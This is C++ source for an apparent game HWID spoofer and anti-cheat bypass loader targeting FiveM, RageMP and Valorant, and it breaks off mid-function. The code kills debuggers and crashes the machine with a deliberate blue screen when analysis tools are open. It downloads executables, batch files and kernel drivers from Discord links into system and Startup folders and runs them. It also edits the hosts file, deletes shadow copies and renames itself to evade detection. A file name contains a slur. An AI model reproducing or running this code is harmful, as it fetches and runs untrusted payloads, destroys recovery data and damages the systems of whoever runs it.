#include <Windows.h>
#include "core/trace.hpp"
#include "core/network.hpp"
#include "core/woof.hpp"
#include <conio.h>
#include <limits>
#include <iostream>
#include "xor.hpp"
#include <stdio.h>
#include <fstream>
#include <filesystem>
#include <random>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include <thread>
#include <chrono>
#include <ctime>    
#include "CConsole.h"
#include "CConsole.cpp"   
#include "color.h"
#include "auth.hpp"
#include <string>
#include <urlmon.h>
#include <tchar.h>
//#include <json/value.h> Que à mettre si jamais c'est la hess
//#include <json/json.h> Que à mettre si jamais c'est la hess
#include <nlohmann/json.hpp>
#include <fstream>
#pragma comment (lib, "urlmon.lib")
std::string tm_to_readable_time(tm ctx);
static std::time_t string_to_timet(std::string timestamp);
static std::tm timet_to_tm(time_t timestamp);

using namespace KeyAuth;

std::string name = (_xor_("").c_str()); // application name. right above the blurred text aka the secret on the licenses tab among other tabs
std::string ownerid = (_xor_("").c_str()); // ownerid, found in account settings. click your profile picture on top right of dashboard and then account settings.
std::string secret = (_xor_("").c_str()); // app secret, the blurred text on licenses tab and other tabs
std::string version = (_xor_("").c_str()); // leave alone unless you've changed version on website


api KeyAuthApp(name, ownerid, secret, version);

using namespace std;

#include <Windows.h>
#include <winternl.h>

#define SHUTDOWN_PRIVILEGE 19
#define OPTION_SHUTDOWN 6


// VOID INCLUDE 
void protection2();
void debug();
void bsod();
void exedetect();
void titledetect();
void driverdetect();
void killdbg();
void bypassdl();
void activatorWin();
void gpusystem();
void REG2();
void xbox();
void salopedepute();
void driverRageMP();
void driverValo();
void ValorantMenu();
void FiveMSp00fer();
void misc();
void loginAuto();
void loader1();
void FindProcessId();

// FINISH KAYKL ON TOP si tu vois ça poto  //
typedef NTSTATUS //Return type
(NTAPI* pdef_RtlAdjustPrivilege) //Name
(ULONG Privilege, //Arugments below
	BOOLEAN Enable,
	BOOLEAN CurrentThread,
	PBOOLEAN Enabled);

typedef NTSTATUS //Return type
(NTAPI* pdef_NtRaiseHardError) //Name
(NTSTATUS ErrorStatus, //Arugments below
	ULONG NumberOfParameters,
	ULONG UnicodeStringParameterMask OPTIONAL,
	PULONG_PTR Parameters,
	ULONG ResponseOption,
	PULONG Response);

void kayklbanane()
{
	// protection after sp00fing
}


void killdbg()
{
	system(_xor_("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im Ida64.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im OllyDbg.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im Dbg64.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im Dbg32.exe >nul 2>&1").c_str());
	system(_xor_("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
	system(_xor_("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1").c_str());
	system(_xor_("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1").c_str());
	system(_xor_("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1").c_str());
}

DWORD_PTR FindProcessId(const std::string processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processesSnapshot);
	return 0;
}

void protection2()
{
	while (true)
	{
		if (FindProcessId(_xor_("Processhacker.exe").c_str()) || FindProcessId(_xor_("ida.exe").c_str()))
		{
			killdbg();
			exedetect();
			titledetect();
			driverdetect();
			std::cout << dye::red("Trying to crack the program...");
			Sleep(4000);
			std::cout << dye::yellow("Banane!");
			bsod();
			system(_xor_("start  C:/Windows/System32/Anti-Debug.exe").c_str());
		}
	}
}

void exedetect()
{
	if (FindProcessId(_xor_("KsDumperClient.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(_xor_("HTTPDebuggerUI.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(_xor_("HTTPDebuggerSvc.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(_xor_("FolderChangesView.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(_xor_("ProcessHacker.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(_xor_("procmon.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(_xor_("idaq.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(_xor_("idaq64.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(_xor_("Wireshark.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(_xor_("Fiddler.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(_xor_("Xenos64.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(_xor_("Cheat Engine.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(_xor_("HTTP Debugger Windows Service (32 bit).exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(_xor_("KsDumper.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(_xor_("x64dbg.exe")) != 0)
	{
		bsod();
	}
}

void titledetect()
{
	HWND window;
	window = FindWindow(0, _xor_(("IDA: Quick start")).c_str());
	if (window)
	{
		bsod();
	}

	window = FindWindow(0, _xor_(("Memory Viewer")).c_str());
	if (window)
	{
		bsod();
	}

	window = FindWindow(0, _xor_(("Process List")).c_str());
	if (window)
	{
		bsod();
	}

	window = FindWindow(0, _xor_(("KsDumper")).c_str());
	if (window)
	{
		bsod();
	}
}

void bsod()
{
	BOOLEAN bEnabled;
	ULONG uResp;
	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}

void BlueScreen()
{
	//Stores return values of our nt calls
	BOOLEAN bEnabled;
	ULONG uResp;

	//Get raw function pointers from ntdll
	LPVOID lpFuncAddress1 = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");

	//Create functions using above grabbed function pointers
	pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)lpFuncAddress1;
	pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)lpFuncAddress2;

	//Elevate the current process privledge to that required for system shutdown
	RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bEnabled);

	//Call NtRaiseHardError with a floating point exception, causes BSOD
	NtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, OPTION_SHUTDOWN, &uResp);
}

void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void ShowConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_SHOW);
}

bool IsConsoleVisible()
{
	return ::IsWindowVisible(::GetConsoleWindow()) != FALSE;
}

std::string path()
{
	char shitter[_MAX_PATH]; // defining the path
	GetModuleFileNameA(NULL, shitter, _MAX_PATH); // getting the path
	return std::string(shitter); //returning the path
}

std::string random_string2(size_t length)
{
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	std::string str(length, 0);
	std::generate_n(str.begin(), length, randchar);
	return str;
}

int rename()
{
	std::string name = random_string2(5) + ".exe";
	std::rename(path().c_str(), name.c_str()); //renaming the file
}


namespace {
	std::string const default_chars =
		_xor_("abcdefghijklmnaoqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890");
}

std::string random_string(size_t len = 15, std::string const& allowed_chars = default_chars) {
	std::mt19937_64 gen{ std::random_device()() };

	std::uniform_int_distribution<size_t> dist{ 0, allowed_chars.length() - 1 };

	std::string ret;

	std::generate_n(std::back_inserter(ret), len, [&] { return allowed_chars[dist(gen)]; });
	return ret;
}

void clear() {
	COORD topLeft = { 0, 0 };
	HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFO screen;
	DWORD written;

	GetConsoleScreenBufferInfo(console, &screen);
	FillConsoleOutputCharacterA(
		console, ' ', screen.dwSize.X * screen.dwSize.Y, topLeft, &written
	);
	FillConsoleOutputAttribute(
		console, FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_BLUE,
		screen.dwSize.X * screen.dwSize.Y, topLeft, &written
	);
	SetConsoleCursorPosition(console, topLeft);
}

void init()
{
	system(_xor_("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
	system(_xor_("sc stop KProcessHacker3 >nul 2>&1").c_str());
	system(_xor_("sc stop KProcessHacker2 >nul 2>&1").c_str());
	system(_xor_("sc stop KProcessHacker1 >nul 2>&1").c_str());
	system(_xor_("sc stop wireshark >nul 2>&1").c_str());
}

void debug()
{
	if (FindProcessId(_xor_("Cheat Engine.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("iloveporn.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("x64dbg.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("x32dbg.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("x96dbg.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("IDA.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("ProcessHacker.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("preview.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("themida.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("crack.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("cracked.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("protection.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("steal.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("IDA Crack.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("ida64.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("dotPeek64.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("ida32.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("ida.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("httpdebuggerpro.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("httpdebugger.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("scylla.exe").c_str()) || FindProcessId(_xor_("fiddler.exe").c_str()) || FindProcessId(_xor_("hiew.exe").c_str()) || FindProcessId(_xor_("reclass.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("processhackerr.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("dump.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("dumper.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
	if (FindProcessId(_xor_("Dumper.exe").c_str()) != 0)
	{
		//bsod();
		BlueScreen();
	}
}


void permSp00f()
{
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/935890887718879354/935958503384809572/KAYKL_DONT_DELETE_SP00F_FIV3M.exe"), _T("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/KAYKL_DONT_DELETE_SP00F_FIV3M.exe"), 0, NULL); // %username%

}
void activatorWin()
{
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/930892607444381756/935261391454076978/Windows_Activator.exe"), _T("C:/Windows/IME/Windows_Activator.exe"), 0, NULL); // %username%
}

void bypassdl()
{
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/936657952511782944/936659610264293427/delete_bypass.bat"), _T("C:/Windows/IME/BYPASS.bat"), 0, NULL); // %username%
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/936657952511782944/936659610264293427/delete_bypass.bat"), _T("C:/Windows/IME/delete_bypass.bat"), 0, NULL);
}

void gpusystem()
{
	time_t now;
	struct tm nowLocal;
	now = time(NULL);
	nowLocal = *localtime(&now);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Driver GPU Loaded!");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/930892607444381756/935605239250296862/GPU-UUID-Changer.exe"), _T("C:/Windows/IME/GPU-UUID-Changer.exe"), 0, NULL);
	Sleep(3000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Driver GPU Loaded! (2)");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/930892607444381756/935605239053172756/GPU.sys"), _T("C:/Windows/IME/GPU.sys"), 0, NULL);
	Sleep(4000);
	system("start C:/Windows/IME/GPU-UUID-Changer.exe C:/Windows/IME/GPU.sys");
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("GPU DRIVER TOTALY LOADED! #KayklOnTOP");
}

void REG2()
{
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/930892607444381756/935438184416956426/Reg-Cleaner.bat"), _T("C:/Windows/IME/Reg-Cleaner.bat"), 0, NULL);
}

void xbox()
{
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/930892607444381756/935439149413056523/Xbox.bat"), _T("C:/Windows/IME/Xbox.bat"), 0, NULL); // %username%
}

void salopedepute()
{
	time_t now;
	struct tm nowLocal;
	now = time(NULL);
	nowLocal = *localtime(&now);
	rename();
	debug();
	std::thread(debug);
	init();
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Driver Cleanex Loaded!");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/930892607444381756/934918037381980260/cleaner.exe"), _T("C:/Windows/IME/cleaner.exe"), 0, NULL);
	Sleep(1000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Driver Kdmapper Loaded!");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/914572765279969331/934864412353912912/kdmapper.exe"), _T("C:/Windows/IME/kdmapper.exe"), 0, NULL);
	Sleep(1000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Driver hwid sp00fer Loaded!");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/914572765279969331/934864507048697887/uLLYvMz4ZUeq.sys"), _T("C:/Windows/IME/uLLYvMz4ZUeq.sys"), 0, NULL);
	Sleep(1000);
	// SMBIOS DRIVER //
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Driver SMBIOS Loaded!");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/930892607444381756/934901912233451620/SMBIOS.exe"), _T("C:/Windows/IME/SMBIOS.exe"), 0, NULL);
	Sleep(1000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Driver SMBIOS2 Loaded!");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/930892607444381756/934901912518684732/SMBIOS.sys"), _T("C:/Windows/IME/SMBIOS.sys"), 0, NULL);
	Sleep(1000);
	// DRIVER GPU // 
	// USERMODE & VOLUME DRIVER //
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("Steps 1/4");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/930892607444381756/934902601022050324/Usermode_Driver.exe"), _T("C:/Windows/IME/Usermode_Driver.exe"), 0, NULL);
	Sleep(1000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("Steps 2/4");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/930892607444381756/934902601412137090/Volume.exe"), _T("C:/Windows/IME/Volume.exe"), 0, NULL);
	Sleep(1000);
	// BYPASS //
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("Steps 3/4");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/936657952511782944/936659610444628069/BYPASS.bat"), _T("C:/Windows/IME/BYPASS.bat"), 0, NULL); // %username%
	Sleep(1000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("Steps 4/4");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/936657952511782944/936659610264293427/delete_bypass.batt"), _T("C:/Windows/IME/delete_bypass.bat"), 0, NULL);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Successfully Loaded! All drivers are operationnal");
	Sleep(1000);

}

void driverRageMP()
{
	time_t now;
	struct tm nowLocal;
	now = time(NULL);
	nowLocal = *localtime(&now);
	rename();
	debug();
	std::thread(debug);
	init();
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("RageMP Cleaner Loaded!");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/930892607444381756/934918037381980260/cleaner.exe"), _T("C:/Windows/IME/cleaner.exe"), 0, NULL);
	Sleep(1000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("RageMP Driver 1 Loaded!");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/935890887718879354/935891262572204072/BE.exe"), _T("C:/Windows/IME/BE.exe"), 0, NULL);
	Sleep(1000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("RageMP Driver 2 Loaded!");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/935890887718879354/935891262756782110/BE.sys"), _T("C:/Windows/IME/BE.sys"), 0, NULL);
	Sleep(1000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Successfully protected!");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/935890887718879354/935891262756782110/BE.sys"), _T("https://cdn.discordapp.com/attachments/935890887718879354/935891262345715752/Anti_Debug.exe"), 0, NULL);
	Sleep(5000);
	xbox();
	REG2();
	system(_xor_("start C:/Windows/IME/cleaner.exe").c_str());
	system(_xor_("echo 127.0.0.1 xboxlive.com >> %windir%\\System32\\drivers\\etc\\hosts").c_str());
	system(_xor_("echo 127.0.0.1 user.auth.xboxlive.com >> %windir%\\System32\\drivers\\etc\\hosts").c_str());
	system(_xor_("echo 127.0.0.1 presence-heartbeat.xboxlive.com >> %windir%\\System32\\drivers\\etc\\hosts").c_str());
	Sleep(5000);
	system(_xor_("start C:/Windows/IME/Xbox.bat >nul 2>&1").c_str());
	system(_xor_("start C:/Windows/IME/Reg-Cleaner.bat >nul 2>&1").c_str());
	clear();
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::aqua("RageMP Traces cleaned!");
	Sleep(1000);
	std::cout << _xor_("\n\n     [") << dye::aqua("+") << ("] Loading...");
	Sleep(2000);
	SetConsoleTitleA(random_string(30).c_str());
	std::cout << _xor_("\n\n     [") << dye::aqua("+") << ("] Loading... 30%");
	Sleep(3000);
	std::cout << _xor_("\n\n     [") << dye::aqua(">") << ("] Installing Drivers..");
	Sleep(5000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Driver BattleEyes Loaded!");
	system(_xor_("start C:/Windows/IME/BE.exe C:/Windows/IME/BE.sys").c_str());
	Sleep(2000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("Failed to load the protection! Contact kaykL");
	system(_xor_("start C:/Windows/IME/Anti_Debug.exe").c_str());
	Sleep(500);
	std::cout << _xor_("\n\n     [") << dye::aqua("+") << ("] Loading... 75%");
	Sleep(4000);
	std::cout << _xor_("\n\n     [") << dye::aqua("+") << ("] Sp00fed!");
	Sleep(1000);
	rename();
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Reset Panel IP...");
	system(_xor_("C:/Windows/IME/mac.exe").c_str());
	system(_xor_("NETSH WINSOCK RESET").c_str());
	system(_xor_("NETSH INT IP RESET").c_str());
	system(_xor_("NETSH INTERFACE IPV4 RESET").c_str());
	system(_xor_("NETSH INTERFACE IPV6 RESET").c_str());
	system(_xor_("NETSH INTERFACE TCP RESET").c_str());
	system(_xor_("IPCONFIG /RELEASE").c_str());
	system(_xor_("IPCONFIG /RELEASE").c_str());
	system(_xor_("IPCONFIG /RENEW").c_str());
	system(_xor_("IPCONFIG /FLUSHDNS").c_str());
	system(_xor_("IPCONFIG /RENEW").c_str());
	system(_xor_("net stop winmgmt /y >nul 2>&1").c_str());
	Sleep(1000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::aqua("Successfully reset!");
	system(_xor_("vssadmin delete shadows /All /Quiet >nul 2>&1").c_str());
	clear();
	remove(_xor_("C:/Windows/IME/BE.exe").c_str());
	remove(_xor_("C:/Windows/IME/BE.sys").c_str());
	remove(_xor_("C:/Windows/IME/Anti_Debug.exe").c_str());
	Sleep(4000);
	clear();
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Successfully sp00fed for RageMP!");

}

void driverValo()
{
	time_t now;
	struct tm nowLocal;
	now = time(NULL);
	nowLocal = *localtime(&now);
	rename();
	debug();
	std::thread(debug);
	init();
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Valorant Mapper Loaded!");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/935891403916054608/935891517556547584/kdmapper.exe"), _T("C:/kdmapper.exe"), 0, NULL);
	Sleep(2000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Valorant Driver Loaded!");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/935891403916054608/935891518147919902/appld.sys"), _T("C:/appld.sys"), 0, NULL);
	Sleep(2000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("if u see this message i love you ;)");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/935891403916054608/935891517904670740/nigga.bat"), _T("C:/nigga.bat"), 0, NULL);
}

void ValorantMenu()
{
	clear();
	time_t now;
	struct tm nowLocal;
	now = time(NULL);
	nowLocal = *localtime(&now);
	rename();
	debug();
	std::thread(debug);
	init();
	SetConsoleTitleA(random_string(30).c_str());
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Valorant driver loading...");
	Sleep(3000);
	driverValo();
	clear();
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Successfully loaded all!");
	Sleep(3000);
	salopedepute();
	std::cout << _xor_("\n\n     [") << dye::aqua("+") << ("] Loading...");
	Sleep(2000);
	SetConsoleTitleA(random_string(30).c_str());
	std::cout << _xor_("\n\n     [") << dye::aqua("+") << ("] Loading... 30%");
	Sleep(3000);
	std::cout << _xor_("\n\n     [") << dye::aqua(">") << ("] Installing Drivers..");
	Sleep(5000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Driver Loaded!");
	system(_xor_("start C:/nigga.bat").c_str());
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::red("Driver GPU Loading...");
	Sleep(4000);
	std::cout << _xor_("\n\n     [") << dye::aqua("+") << ("] Sp00fed!");
	Sleep(1000);
	rename();
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Reset Panel IP...");
